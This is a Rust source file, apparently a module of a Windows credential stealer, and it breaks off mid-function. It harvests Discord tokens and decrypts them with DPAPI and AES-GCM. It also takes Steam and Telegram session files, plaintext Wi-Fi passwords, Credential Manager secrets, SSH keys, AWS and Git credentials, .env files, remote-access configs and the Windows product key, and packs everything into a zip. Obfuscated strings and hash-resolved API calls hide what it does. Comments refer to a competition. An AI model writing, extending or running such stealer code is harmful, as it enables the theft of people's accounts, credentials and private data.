//! Tier 4: application sessions & system credentials.
//! App_Discord.json (tokens), App_Steam/{ssnf,vdf}, App_Telegram/tdata,
//! App_OBS/profiles, FileZilla XML, Wi-Fi (WLAN API), Cred Manager, SSH keys,
//! AWS/Git creds, .env files, saved .rdp, mRemoteNG confCons.xml, gaming
//! platforms (Epic, Battle.net, EA, Ubisoft, Riot, Rockstar, GOG, Minecraft,
//! Roblox), messaging (Skype, Slack, Teams, WhatsApp, Pidgin), VPN clients
//! (ProtonVPN, NordVPN, ExpressVPN, Mullvad, Surfshark, AnyConnect,
//! GlobalProtect), email clients (FoxMail, MailBird, MailMaster, Outlook),
//! PuTTY/IDM/cloud storage, Sticky Notes, Windows product key.

use std::ffi::c_void;
use std::path::{Path, PathBuf};

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;

use crate::fsutil::{read_file, walk_files};
use crate::info::Info;
use crate::resolve::{resolve, wide};
use crate::zipw::ZipBuilder;

const ONE_MB: u64 = 1024 * 1024;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn env_dir(var: &str) -> Option<PathBuf> {
    std::env::var(var).ok().map(PathBuf::from).filter(|p| p.is_dir())
}

fn appdata() -> Option<PathBuf> {
    env_dir("APPDATA")
}

fn userprofile() -> Option<PathBuf> {
    env_dir("USERPROFILE")
}

/// Path of `p` relative to `root`, forward slashes, for zip entry names.
fn rel_zip(root: &Path, p: &Path) -> String {
    p.strip_prefix(root)
        .map(|r| r.to_string_lossy().replace('\\', "/"))
        .unwrap_or_else(|_| {
            p.file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default()
        })
}

fn add_tree(zip: &mut ZipBuilder, root: &Path, zip_prefix: &str, cap: u64) -> usize {
    let mut files = Vec::new();
    walk_files(root, cap, &mut files);
    let mut added = 0;
    for (p, _) in &files {
        if let Some(bytes) = read_file(p) {
            let rel = rel_zip(root, p);
            if rel.is_empty() {
                continue;
            }
            zip.add_file(&format!("{zip_prefix}/{rel}"), &bytes);
            added += 1;
        }
    }
    added
}

/// Copy flat files matching `filter` from `dir` (non-recursive).
fn add_flat(
    zip: &mut ZipBuilder,
    dir: &Path,
    zip_prefix: &str,
    cap: u64,
    filter: &dyn Fn(&str) -> bool,
) -> usize {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return 0;
    };
    let mut added = 0;
    for entry in entries.flatten() {
        let p = entry.path();
        let Ok(meta) = entry.metadata() else {
            continue;
        };
        if !meta.is_file() || meta.len() == 0 || meta.len() > cap {
            continue;
        }
        let Some(name) = p.file_name().map(|n| n.to_string_lossy().into_owned()) else {
            continue;
        };
        if !filter(&name) {
            continue;
        }
        if let Some(bytes) = read_file(&p) {
            zip.add_file(&format!("{zip_prefix}/{name}"), &bytes);
            added += 1;
        }
    }
    added
}

/// Competition example zips prefix every JSON file with a UTF-8 BOM.
fn json_bom(value: &serde_json::Value) -> Vec<u8> {
    let mut v = vec![0xEF, 0xBB, 0xBF];
    v.extend_from_slice(&serde_json::to_vec_pretty(value).unwrap_or_default());
    v
}

// ---------------------------------------------------------------------------
// DPAPI (CryptUnprotectData via crypt32, resolved by hash)
// ---------------------------------------------------------------------------

#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

type FnCryptUnprotectData = unsafe extern "system" fn(
    p_in: *const DataBlob,
    ppsz_descr: *mut *mut u16,
    p_entropy: *const DataBlob,
    pv_reserved: *mut c_void,
    p_prompt: *mut c_void,
    flags: u32,
    p_out: *mut DataBlob,
) -> i32;
type FnLocalFree = unsafe extern "system" fn(mem: *mut c_void) -> *mut c_void;

unsafe fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    let f: FnCryptUnprotectData =
        std::mem::transmute(resolve(&crate::obf!("crypt32.dll"), crate::api!("CryptUnprotectData")));
    if f as usize == 0 {
        return None;
    }
    let input = DataBlob {
        cb_data: data.len() as u32,
        pb_data: data.as_ptr() as *mut u8,
    };
    let mut out = DataBlob {
        cb_data: 0,
        pb_data: std::ptr::null_mut(),
    };
    if f(
        &input,
        std::ptr::null_mut(),
        std::ptr::null(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0x1, // CRYPTPROTECT_UI_FORBIDDEN — never pop a DPAPI prompt
        &mut out,
    ) == 0
    {
        return None;
    }
    if out.pb_data.is_null() || out.cb_data == 0 {
        return None;
    }
    let result = std::slice::from_raw_parts(out.pb_data, out.cb_data as usize).to_vec();
    let free: FnLocalFree = std::mem::transmute(resolve("kernel32.dll", crate::api!("LocalFree")));
    if free as usize != 0 {
        free(out.pb_data.cast());
    }
    Some(result)
}

/// Chromium-style "v10" AES-256-GCM master key from a Local State file.
fn master_key_from_local_state(local_state: &Path) -> Option<Vec<u8>> {
    let bytes = read_file(local_state)?;
    let json: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
    let enc_key = json
        .get(crate::obf!("os_crypt"))?
        .get(crate::obf!("encrypted_key"))?
        .as_str()?;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(enc_key)
        .ok()?;
    let dpapi = crate::obf!("DPAPI");
    let blob = raw.strip_prefix(dpapi.as_bytes())?;
    unsafe { dpapi_unprotect(blob) }
}

fn aes_gcm_decrypt(key: &[u8], blob: &[u8]) -> Option<Vec<u8>> {
    // "v10" + 12-byte nonce + ciphertext + 16-byte tag.
    let v10 = crate::obf!("v10");
    let body = blob.strip_prefix(v10.as_bytes())?;
    if body.len() < 12 + 16 {
        return None;
    }
    let (nonce, ct) = body.split_at(12);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher.decrypt(Nonce::from_slice(nonce), ct).ok()
}

// ---------------------------------------------------------------------------
// Discord
// ---------------------------------------------------------------------------

fn is_token_char(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'_' || c == b'-' || c == b'.'
}

fn is_valid_token(run: &[u8]) -> bool {
    if run.len() == 88 && run.starts_with(crate::obf!("mfa.").as_bytes()) {
        return run[4..]
            .iter()
            .all(|&c| c.is_ascii_alphanumeric() || c == b'_' || c == b'-');
    }
    let parts: Vec<&[u8]> = run.split(|&c| c == b'.').collect();
    if parts.len() != 3 {
        return false;
    }
    let ok_chars =
        |p: &[u8]| p.iter().all(|&c| c.is_ascii_alphanumeric() || c == b'_' || c == b'-');
    (24..=26).contains(&parts[0].len())
        && parts[1].len() == 6
        && parts[2].len() >= 27
        && parts.iter().all(|p| ok_chars(p))
}

fn scan_discord_tokens(data: &[u8], plain: &mut Vec<String>, encrypted: &mut Vec<String>) {
    let marker = crate::obf!("dQw4w9WgXcQ:");
    let marker = marker.as_bytes();
    let mut i = 0;
    while i < data.len() {
        if data[i..].starts_with(marker) {
            let start = i + marker.len();
            let mut end = start;
            while end < data.len()
                && (data[end].is_ascii_alphanumeric()
                    || data[end] == b'+'
                    || data[end] == b'/'
                    || data[end] == b'=')
            {
                end += 1;
            }
            if end > start {
                if let Ok(s) = std::str::from_utf8(&data[start..end]) {
                    encrypted.push(s.to_string());
                }
            }
            i = end;
            continue;
        }
        if is_token_char(data[i]) {
            let start = i;
            while i < data.len() && is_token_char(data[i]) {
                i += 1;
            }
            let run = &data[start..i];
            if is_valid_token(run) {
                if let Ok(s) = std::str::from_utf8(run) {
                    plain.push(s.to_string());
                }
            }
        } else {
            i += 1;
        }
    }
}

fn collect_discord(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    // (app display name, token), deduped by token.
    let mut tokens: Vec<(String, String)> = Vec::new();
    let mut push_unique = |app: &str, t: String| {
        if !t.is_empty() && !tokens.iter().any(|(_, e)| *e == t) {
            tokens.push((app.to_string(), t));
        }
    };

    for (sub, app) in [
        (crate::obf!("discord"), "Discord"),
        (crate::obf!("discordcanary"), "Discord Canary"),
        (crate::obf!("discordptb"), "Discord PTB"),
    ] {
        let base = roaming.join(sub);
        let leveldb = base.join(crate::obf!(r"Local Storage\leveldb"));
        let Ok(entries) = std::fs::read_dir(&leveldb) else {
            continue;
        };
        let mut plain = Vec::new();
        let mut encrypted = Vec::new();
        for entry in entries.flatten() {
            let p = entry.path();
            let name = p
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            if !(name.ends_with(".log") || name.ends_with(".ldb")) {
                continue;
            }
            let Ok(meta) = p.metadata() else { continue };
            if meta.len() > 16 * ONE_MB {
                continue;
            }
            if let Some(bytes) = read_file(&p) {
                scan_discord_tokens(&bytes, &mut plain, &mut encrypted);
            }
        }
        for t in plain {
            push_unique(app, t);
        }
        if !encrypted.is_empty() {
            let key = master_key_from_local_state(&base.join(crate::obf!("Local State")))
                .or_else(|| {
                    master_key_from_local_state(&roaming.join(crate::obf!(r"discord\Local State")))
                });
            if let Some(key) = key {
                for enc in encrypted {
                    if let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(&enc) {
                        if let Some(pt) = aes_gcm_decrypt(&key, &blob) {
                            push_unique(app, String::from_utf8_lossy(&pt).into_owned());
                        }
                    }
                }
            }
        }
    }

    if tokens.is_empty() {
        return;
    }
    // Competition example shape: one object per token; user/email/phone and
    // channels require Discord API calls, which the network rules forbid.
    let out: Vec<serde_json::Value> = tokens
        .iter()
        .map(|(app, token)| {
            serde_json::json!({
                "App": app,
                "Token": token,
                "UserName": "null",
                "Email": "null",
                "Phone": "null",
                "DiscordChannels": serde_json::Value::Array(Vec::new()),
            })
        })
        .collect();
    let mut bytes = vec![0xEF, 0xBB, 0xBF]; // UTF-8 BOM, as in the examples
    bytes.extend_from_slice(&serde_json::to_vec_pretty(&out).unwrap_or_default());
    zip.add_file("App_Discord.json", &bytes);
    info.add_app("Discord");
}

// ---------------------------------------------------------------------------
// Steam
// ---------------------------------------------------------------------------

const HKEY_CURRENT_USER: usize = 0x8000_0001;

/// Small local RegGetValueW string helper (sysinfo's is private). Reads a
/// UTF-16 string value from any root key via the hash-resolved pattern.
fn reg_read_string(hkey: usize, subkey: &str, value: &str) -> Option<String> {
    unsafe {
        let f: FnRegGetValueW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
        if f as usize == 0 {
            return None;
        }
        let mut buf = vec![0u8; 2048];
        let mut len = buf.len() as u32;
        let status = f(
            hkey,
            wide(subkey).as_ptr(),
            wide(value).as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            buf.as_mut_ptr(),
            &mut len,
        );
        if status != 0 || len < 2 {
            return None;
        }
        let u16s = std::slice::from_raw_parts(buf.as_ptr() as *const u16, (len as usize) / 2);
        let end = u16s.iter().position(|&c| c == 0).unwrap_or(u16s.len());
        let s = String::from_utf16_lossy(&u16s[..end]).trim().to_string();
        if s.is_empty() {
            None
        } else {
            Some(s)
        }
    }
}

/// Every plausible Steam root: default location plus registry-recorded custom
/// install paths, deduplicated case-insensitively.
fn steam_roots() -> Vec<PathBuf> {
    let mut roots: Vec<PathBuf> = Vec::new();
    if let Ok(pf86) = std::env::var("ProgramFiles(x86)") {
        roots.push(PathBuf::from(pf86).join(crate::obf!("Steam")));
    }
    if let Some(p) = reg_read_string(
        HKEY_CURRENT_USER,
        &crate::obf!(r"Software\Valve\Steam"),
        &crate::obf!("SteamPath"),
    ) {
        roots.push(PathBuf::from(p));
    }
    if let Some(p) = reg_read_string(
        HKEY_LOCAL_MACHINE,
        &crate::obf!(r"SOFTWARE\WOW6432Node\Valve\Steam"),
        &crate::obf!("InstallPath"),
    ) {
        roots.push(PathBuf::from(p));
    }
    let mut seen: Vec<String> = Vec::new();
    roots
        .into_iter()
        .filter(|r| {
            let key = r
                .to_string_lossy()
                .replace('/', "\\")
                .trim_end_matches('\\')
                .to_ascii_lowercase();
            if !r.is_dir() || seen.contains(&key) {
                false
            } else {
                seen.push(key);
                true
            }
        })
        .collect()
}

fn collect_steam(zip: &mut ZipBuilder, info: &mut Info) {
    let roots = steam_roots();
    if roots.is_empty() {
        return;
    }
    let mut found = false;
    let mut accounts: Vec<String> = Vec::new();

    for root in &roots {
        found |= add_flat(zip, root, "App_Steam/ssnf", 16 * ONE_MB, &|n| {
            n.starts_with(&crate::obf!("ssfn"))
        }) > 0;
        let config = root.join("config");
        found |= add_flat(zip, &config, "App_Steam/vdf", 16 * ONE_MB, &|n| {
            n.ends_with(".vdf")
        }) > 0;

        if let Some(bytes) = read_file(&config.join(crate::obf!("loginusers.vdf"))) {
            let text = String::from_utf8_lossy(&bytes);
            let mut lines = text.lines().peekable();
            let acct_key = crate::obf!("\"AccountName\"");
            while let Some(line) = lines.next() {
                if line.contains(&acct_key) {
                    // Same-line value or the next quoted token.
                    let after = line.split(&acct_key).nth(1).unwrap_or("");
                    let name =
                        extract_quoted(after).or_else(|| lines.next().and_then(extract_quoted));
                    if let Some(n) = name {
                        if !accounts.iter().any(|a| *a == n) {
                            accounts.push(n);
                        }
                    }
                }
            }
        }
    }

    if !accounts.is_empty() {
        zip.add_file("App_Steam/AccountsList.txt", accounts.join("\n").as_bytes());
        found = true;
    }
    if found {
        info.add_app("Steam");
    }
}

fn extract_quoted(s: &str) -> Option<String> {
    let start = s.find('"')? + 1;
    let end = s[start..].find('"')? + start;
    let v = &s[start..end];
    if v.is_empty() {
        None
    } else {
        Some(v.to_string())
    }
}

// ---------------------------------------------------------------------------
// Telegram
// ---------------------------------------------------------------------------

fn collect_telegram(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let tdata = roaming.join(crate::obf!(r"Telegram Desktop\tdata"));
    if !tdata.is_dir() {
        return;
    }
    let mut added = add_flat(zip, &tdata, "App_Telegram/tdata", ONE_MB, &|_| true);
    if let Ok(entries) = std::fs::read_dir(&tdata) {
        for entry in entries.flatten() {
            let p = entry.path();
            if !p.is_dir() {
                continue;
            }
            let name = p
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            if name.starts_with(&crate::obf!("D877F783D5D3EF8C")) {
                added += add_tree(zip, &p, &format!("App_Telegram/tdata/{name}"), ONE_MB);
            }
        }
    }
    if added > 0 {
        info.add_app("Telegram");
    }
}

// ---------------------------------------------------------------------------
// WLAN (Wi-Fi profiles, plaintext keys)
// ---------------------------------------------------------------------------

type FnWlanOpenHandle = unsafe extern "system" fn(
    client_ver: u32,
    reserved: *const c_void,
    negotiated: *mut u32,
    handle: *mut usize,
) -> u32;
type FnWlanEnumInterfaces =
    unsafe extern "system" fn(handle: usize, reserved: *const c_void, list: *mut *mut u8) -> u32;
type FnWlanGetProfileList = unsafe extern "system" fn(
    handle: usize,
    guid: *const u8,
    reserved: *const c_void,
    list: *mut *mut u8,
) -> u32;
type FnWlanGetProfile = unsafe extern "system" fn(
    handle: usize,
    guid: *const u8,
    profile_name: *const u16,
    reserved: *const c_void,
    xml: *mut *mut u16,
    flags: *mut u32,
    granted: *mut u32,
) -> u32;
type FnWlanFreeMemory = unsafe extern "system" fn(mem: *mut c_void);
type FnWlanCloseHandle = unsafe extern "system" fn(handle: usize, reserved: *const c_void) -> u32;

const WLAN_PROFILE_GET_PLAINTEXT_KEY: u32 = 4;
/// sizeof(WLAN_INTERFACE_INFO) = GUID(16) + [u16;256] + u32
const WLAN_INTERFACE_INFO_SIZE: usize = 16 + 512 + 4;
/// sizeof(WLAN_PROFILE_INFO) = [u16;256] + u32
const WLAN_PROFILE_INFO_SIZE: usize = 512 + 4;

unsafe fn wstr(p: *const u16, max: usize) -> String {
    if p.is_null() {
        return String::new();
    }
    let mut len = 0;
    while len < max && *p.add(len) != 0 {
        len += 1;
    }
    String::from_utf16_lossy(std::slice::from_raw_parts(p, len))
}

fn xml_tag(xml: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = xml.find(&open)? + open.len();
    let end = xml[start..].find(&close)? + start;
    Some(xml[start..end].to_string())
}

fn collect_wifi(zip: &mut ZipBuilder, info: &mut Info) {
    unsafe {
        let open: FnWlanOpenHandle =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanOpenHandle")));
        let enum_if: FnWlanEnumInterfaces =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanEnumInterfaces")));
        let get_profiles: FnWlanGetProfileList =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanGetProfileList")));
        let get_profile: FnWlanGetProfile =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanGetProfile")));
        let free_mem: FnWlanFreeMemory =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanFreeMemory")));
        let close: FnWlanCloseHandle =
            std::mem::transmute(resolve(&crate::obf!("wlanapi.dll"), crate::api!("WlanCloseHandle")));
        if open as usize == 0
            || enum_if as usize == 0
            || get_profiles as usize == 0
            || get_profile as usize == 0
            || free_mem as usize == 0
            || close as usize == 0
        {
            return;
        }

        let mut negotiated = 0u32;
        let mut handle = 0usize;
        if open(2, std::ptr::null(), &mut negotiated, &mut handle) != 0 || handle == 0 {
            return;
        }

        let mut profiles_out: Vec<serde_json::Value> = Vec::new();

        let mut if_list: *mut u8 = std::ptr::null_mut();
        if enum_if(handle, std::ptr::null(), &mut if_list) == 0 && !if_list.is_null() {
            let if_count = *(if_list as *const u32);
            let infos = if_list.add(8);
            for i in 0..if_count as isize {
                let if_info = infos.offset(i * WLAN_INTERFACE_INFO_SIZE as isize);
                let guid = if_info; // GUID is the first field

                let mut prof_list: *mut u8 = std::ptr::null_mut();
                if get_profiles(handle, guid, std::ptr::null(), &mut prof_list) != 0
                    || prof_list.is_null()
                {
                    continue;
                }
                let prof_count = *(prof_list as *const u32);
                let profs = prof_list.add(8);
                for j in 0..prof_count as isize {
                    let prof = profs.offset(j * WLAN_PROFILE_INFO_SIZE as isize);
                    let name_ptr = prof as *const u16;
                    let profile_name = wstr(name_ptr, 256);
                    if profile_name.is_empty() {
                        continue;
                    }
                    let mut xml_ptr: *mut u16 = std::ptr::null_mut();
                    let mut flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                    let mut granted = 0u32;
                    if get_profile(
                        handle,
                        guid,
                        name_ptr,
                        std::ptr::null(),
                        &mut xml_ptr,
                        &mut flags,
                        &mut granted,
                    ) != 0
                        || xml_ptr.is_null()
                    {
                        continue;
                    }
                    let xml = wstr(xml_ptr, 64 * 1024);
                    free_mem(xml_ptr.cast());

                    let ssid = xml
                        .find("<SSID>")
                        .and_then(|pos| xml_tag(&xml[pos..], "name"))
                        .unwrap_or(profile_name);
                    let auth = xml_tag(&xml, "authentication").unwrap_or_default();
                    let password = xml_tag(&xml, &crate::obf!("keyMaterial")).unwrap_or_default();
                    profiles_out.push(serde_json::json!({
                        "ssid": ssid,
                        "auth": auth,
                        "password": password,
                    }));
                }
                free_mem(prof_list.cast());
            }
            free_mem(if_list.cast());
        }
        close(handle, std::ptr::null());

        if !profiles_out.is_empty() {
            zip.add_file("wifi.json", &json_bom(&serde_json::Value::Array(profiles_out)));
            info.add_app("WiFi");
        }
    }
}

// ---------------------------------------------------------------------------
// Windows Credential Manager
// ---------------------------------------------------------------------------

#[repr(C)]
struct CredentialW {
    flags: u32,
    typ: u32,
    target_name: *mut u16,
    comment: *mut u16,
    last_written: u64,
    blob_size: u32,
    blob: *mut u8,
    persist: u32,
    attr_count: u32,
    attributes: *mut c_void,
    target_alias: *mut u16,
    user_name: *mut u16,
}

type FnCredEnumerateW = unsafe extern "system" fn(
    filter: *const u16,
    flags: u32,
    count: *mut u32,
    creds: *mut *mut *mut CredentialW,
) -> i32;
type FnCredReadW = unsafe extern "system" fn(
    target: *const u16,
    typ: u32,
    flags: u32,
    cred: *mut *mut CredentialW,
) -> i32;
type FnCredFree = unsafe extern "system" fn(buf: *mut c_void);

const CRED_TYPE_GENERIC: u32 = 1;

/// Credential blobs are UTF-16 for text creds but may be raw bytes/UTF-8.
/// Strict-decode UTF-16 and require mostly-printable output; else UTF-8 lossy.
fn decode_cred_blob(blob: &[u8]) -> String {
    if blob.len() >= 2 && blob.len() % 2 == 0 {
        let units: Vec<u16> = blob
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        let end = units.iter().position(|&c| c == 0).unwrap_or(units.len());
        if let Ok(s) = String::from_utf16(&units[..end]) {
            let total = s.chars().count();
            let printable = s.chars().filter(|c| !c.is_control()).count();
            if total > 0 && printable * 10 >= total * 9 {
                return s;
            }
        }
    }
    String::from_utf8_lossy(blob)
        .trim_end_matches('\0')
        .to_string()
}

fn collect_credentials(zip: &mut ZipBuilder, info: &mut Info) {
    unsafe {
        let enumerate: FnCredEnumerateW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("CredEnumerateW")));
        let read: FnCredReadW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("CredReadW")));
        let free: FnCredFree = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("CredFree")));
        if enumerate as usize == 0 || read as usize == 0 || free as usize == 0 {
            return;
        }

        let mut count = 0u32;
        let mut creds: *mut *mut CredentialW = std::ptr::null_mut();
        if enumerate(std::ptr::null(), 0, &mut count, &mut creds) == 0 || creds.is_null() {
            return;
        }

        let mut out: Vec<serde_json::Value> = Vec::new();
        for i in 0..count as isize {
            let entry = *creds.offset(i);
            if entry.is_null() || (*entry).typ != CRED_TYPE_GENERIC {
                continue;
            }
            let service = wstr((*entry).target_name, 512);
            let username = wstr((*entry).user_name, 512);
            if service.is_empty() {
                continue;
            }
            let mut password = String::new();
            let mut full: *mut CredentialW = std::ptr::null_mut();
            if read((*entry).target_name, CRED_TYPE_GENERIC, 0, &mut full) != 0 && !full.is_null() {
                if !(*full).blob.is_null() && (*full).blob_size > 0 {
                    let blob = std::slice::from_raw_parts((*full).blob, (*full).blob_size as usize);
                    password = decode_cred_blob(blob);
                }
                free(full.cast());
            }
            out.push(serde_json::json!({
                "service": service,
                "username": username,
                "password": password,
            }));
        }
        free(creds.cast());

        if !out.is_empty() {
            zip.add_file("credentials.json", &json_bom(&serde_json::Value::Array(out)));
            info.add_app("Credential Manager");
        }
    }
}

// ---------------------------------------------------------------------------
// Loose files: SSH, AWS, Git, env, RDP, mRemoteNG, Signal, Ngrok, OpenVPN
// ---------------------------------------------------------------------------

fn collect_loose(zip: &mut ZipBuilder, info: &mut Info) {
    if let Some(home) = userprofile() {
        if add_flat(zip, &home.join(crate::obf!(".ssh")), "SSH", ONE_MB, &|_| true) > 0 {
            info.add_app("SSH");
        }
        if add_flat(zip, &home.join(crate::obf!(".aws")), "AWS", ONE_MB, &|n| {
            n == crate::obf!("credentials") || n == crate::obf!("config")
        }) > 0
        {
            info.add_app("AWS");
        }
        let mut git = 0;
        for name in [crate::obf!(".gitconfig"), crate::obf!(".git-credentials")] {
            if let Some(bytes) = read_file(&home.join(&name)) {
                zip.add_file(&format!("Git/{name}"), &bytes);
                git += 1;
            }
        }
        if git > 0 {
            info.add_app("Git");
        }

        let is_env = |n: &str| n == ".env" || n.ends_with(".env");
        let mut envs = 0;
        envs += add_flat(zip, &home.join("Desktop"), "EnvFiles", ONE_MB, &is_env);
        envs += add_flat(zip, &home.join("Documents"), "EnvFiles", ONE_MB, &is_env);
        if envs > 0 {
            info.add_app("EnvFiles");
        }

        if add_flat(zip, &home.join("Documents"), "RDP", ONE_MB, &|n| {
            n.to_ascii_lowercase().ends_with(".rdp")
        }) > 0
        {
            info.add_app("RDP");
        }

        if let Some(bytes) = read_file(&home.join(crate::obf!(r".ngrok2\ngrok.yml"))) {
            zip.add_file("App_Ngrok/ngrok.yml", &bytes);
            info.add_app("Ngrok");
        }

        let ovpn = home.join(crate::obf!(r"OpenVPN\config"));
        if ovpn.is_dir() && add_tree(zip, &ovpn, "App_OpenVPN", ONE_MB) > 0 {
            info.add_app("OpenVPN");
        }
    }

    if let Some(roaming) = appdata() {
        if let Some(bytes) = read_file(&roaming.join(crate::obf!(r"mRemoteNG\confCons.xml"))) {
            zip.add_file("App_mRemoteNG/confCons.xml", &bytes);
            info.add_app("mRemoteNG");
        }
        if let Some(bytes) = read_file(&roaming.join(crate::obf!(r"Signal\config.json"))) {
            zip.add_file("App_Signal/config.json", &bytes);
            info.add_app("Signal");
        }
        if let Some(bytes) = read_file(&roaming.join(crate::obf!("WinSCP.ini"))) {
            zip.add_file("App_WinSCP.ini", &bytes);
            info.add_app("WinSCP");
        }
        if add_flat(zip, &roaming.join(crate::obf!("FileZilla")), "App_FileZilla", ONE_MB, &|n| {
            n.to_ascii_lowercase().ends_with(".xml")
        }) > 0
        {
            info.add_app("FileZilla");
        }
        let obs = roaming.join(crate::obf!("obs-studio"));
        if obs.is_dir() {
            let mut files = Vec::new();
            walk_files(&obs, ONE_MB, &mut files);
            let mut added = 0;
            for (p, _) in &files {
                let name = p
                    .file_name()
                    .map(|n| n.to_string_lossy().to_lowercase())
                    .unwrap_or_default();
                if !(name.ends_with(".ini") || name.ends_with(".json")) {
                    continue;
                }
                if let Some(bytes) = read_file(p) {
                    let rel = rel_zip(&obs, p);
                    if !rel.is_empty() {
                        zip.add_file(&format!("App_OBS/{rel}"), &bytes);
                        added += 1;
                    }
                }
            }
            if added > 0 {
                info.add_app("OBS");
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Windows product key (DigitalProductId base24 decode)
// ---------------------------------------------------------------------------

const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
const RRF_RT_ANY: u32 = 0x0000_ffff;

type FnRegGetValueW = unsafe extern "system" fn(
    hkey: usize,
    subkey: *const u16,
    value: *const u16,
    flags: u32,
    pdwtype: *mut u32,
    data: *mut u8,
    cbdata: *mut u32,
) -> i32;

/// DigitalProductId (v3): 15 key bytes at offset 52, base24-encoded with
/// dashes every 5 characters.
fn decode_product_id(dpid: &[u8]) -> Option<String> {
    let charset = crate::obf!("BCDFGHJKMPQRTVWXY2346789");
    let mut key = dpid.get(52..67)?.to_vec();
    let mut out = [0u8; 25];
    for ch in out.iter_mut().rev() {
        let mut acc: u32 = 0;
        for b in key.iter_mut().rev() {
            acc = (acc << 8) | *b as u32;
            *b = (acc / 24) as u8;
            acc %= 24;
        }
        *ch = charset.as_bytes()[acc as usize];
    }
    let s = std::str::from_utf8(&out).ok()?;
    Some(
        s.as_bytes()
            .chunks(5)
            .map(|c| std::str::from_utf8(c).unwrap_or_default())
            .collect::<Vec<_>>()
            .join("-"),
    )
}

fn collect_product_key(zip: &mut ZipBuilder, info: &mut Info) {
    unsafe {
        let f: FnRegGetValueW =
            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
        if f as usize == 0 {
            return;
        }
        let subkey = wide(&crate::obf!(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"));
        let value = wide(&crate::obf!("DigitalProductId"));
        let mut len = 0u32;
        let status = f(
            HKEY_LOCAL_MACHINE,
            subkey.as_ptr(),
            value.as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut len,
        );
        // ERROR_SUCCESS or ERROR_MORE_DATA (234); either reports the size.
        if !(status == 0 || status == 234) || len < 67 {
            return;
        }
        let mut buf = vec![0u8; len as usize];
        let status = f(
            HKEY_LOCAL_MACHINE,
            subkey.as_ptr(),
            value.as_ptr(),
            RRF_RT_ANY,
            std::ptr::null_mut(),
            buf.as_mut_ptr(),
            &mut len,
        );
        if status != 0 {
            return;
        }
        let Some(key) = decode_product_id(&buf[..len as usize]) else {
            return;
        };
        zip.add_file("System/ProductKey.txt", key.as_bytes());
        info.add_app("Product Key");
    }
}

// ---------------------------------------------------------------------------
// Tier 4 gaming platforms
// ---------------------------------------------------------------------------

/// Recursive copy filtered by file name (lowercased), relative structure kept.
fn add_tree_filtered(
    zip: &mut ZipBuilder,
    root: &Path,
    zip_prefix: &str,
    cap: u64,
    filter: &dyn Fn(&str) -> bool,
) -> usize {
    let mut files = Vec::new();
    walk_files(root, cap, &mut files);
    let mut added = 0;
    for (p, _) in &files {
        let name = p
            .file_name()
            .map(|n| n.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        if !filter(&name) {
            continue;
        }
        if let Some(bytes) = read_file(p) {
            let rel = rel_zip(root, p);
            if rel.is_empty() {
                continue;
            }
            zip.add_file(&format!("{zip_prefix}/{rel}"), &bytes);
            added += 1;
        }
    }
    added
}

fn collect_epic(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(local) = env_dir("LOCALAPPDATA") else { return };
    let base = local.join(crate::obf!("EpicGamesLauncher"));
    if !base.is_dir() {
        return;
    }
    let mut added = 0;
    let cfg = base.join(crate::obf!(r"Saved\Config\Windows"));
    if cfg.is_dir() {
        added += add_tree_filtered(zip, &cfg, "App_Epic/Saved/Config/Windows", 4 * ONE_MB, &|n| {
            n.ends_with(".ini")
        });
    }
    let saved = base.join("Saved");
    if let Ok(entries) = std::fs::read_dir(&saved) {
        for entry in entries.flatten() {
            let p = entry.path();
            if !p.is_dir() {
                continue;
            }
            let name = p
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            if name.to_ascii_lowercase().starts_with(&crate::obf!("webcache")) {
                added += add_tree_filtered(
                    zip,
                    &p,
                    &format!("App_Epic/Saved/{name}"),
                    ONE_MB,
                    &|_| true,
                );
            }
        }
    }
    if added > 0 {
        info.add_app("Epic Games");
    }
}

fn collect_battlenet(zip: &mut ZipBuilder, info: &mut Info) {
    let Some(roaming) = appdata() else { return };
    let base = roaming.join(crate::obf!("Battle.net"));
    if !base.is_dir() {
        return;
    }
    let mut added = add_flat(zip, &base, "App_BattleNet", 4 * ONE_MB, &|n| {
